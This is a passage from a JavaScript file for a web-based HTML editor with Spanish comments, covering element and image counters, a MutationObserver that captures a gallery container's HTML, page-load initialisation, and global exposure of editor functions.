            const stats = getHTMLStats(htmlContent);
            
            if (elementCount) {
                elementCount.textContent = `${stats.elements} elementos`;
            }
            
            if (imageCount) {
                imageCount.textContent = `${stats.images} imágenes`;
            }
        } catch (error) {
            if (elementCount) {
                elementCount.textContent = '0 elementos';
            }
            if (imageCount) {
                imageCount.textContent = '0 imágenes';
            }
        }
    } else {
        if (elementCount) {
            elementCount.textContent = '0 elementos';
        }
        if (imageCount) {
            imageCount.textContent = '0 imágenes';
        }
    }
}

// Observer para detectar cuando se genera la galería dinámicamente
function setupImagesContainerObserver() {
    const imagesContainer = document.getElementById('images-container');
    if (imagesContainer) {
        // Crear un observer para detectar cambios en el contenedor
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    // Se agregaron elementos al contenedor
                    setTimeout(() => {
                        if (!originalImagesHTML || originalImagesHTML.length < 1000) {
                            // Solo capturar si no tenemos HTML o si es muy pequeño
                            const currentHTML = imagesContainer.innerHTML;
                            if (currentHTML.length > 1000) { // Si tiene contenido sustancial
                                originalImagesHTML = currentHTML;
                                console.log('🔄 HTML dinámico capturado automáticamente:', currentHTML.length + ' caracteres');
                            }
                        }
                    }, 500);
                }
            });
        });
        
        // Observar cambios en el contenedor
        observer.observe(imagesContainer, {
            childList: true,
            subtree: true
        });
        
        console.log('👁️ Observer configurado para images-container');
    }
}

// Inicializar el sistema cuando el DOM esté listo
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        initializeDynamicHTMLSystem();
        setupImagesContainerObserver();
    });
} else {
    initializeDynamicHTMLSystem();
    setupImagesContainerObserver();
}

// Exponer funciones globalmente para uso en HTML
window.applyDynamicHTML = applyDynamicHTML;
window.resetToOriginalHTML = resetToOriginalHTML;
window.previewHTML = previewHTML;
window.exportCurrentHTML = exportCurrentHTML;
window.loadHTMLFromFile = loadHTMLFromFile;
window.clearHTMLEditor = clearHTMLEditor;
window.validateHTML = validateHTML;
window.getHTMLStats = getHTMLStats;
window.updateHTMLStats = updateHTMLStats;
window.captureCurrentHTML = captureCurrentHTML;
window.saveHTMLData = saveHTMLData;
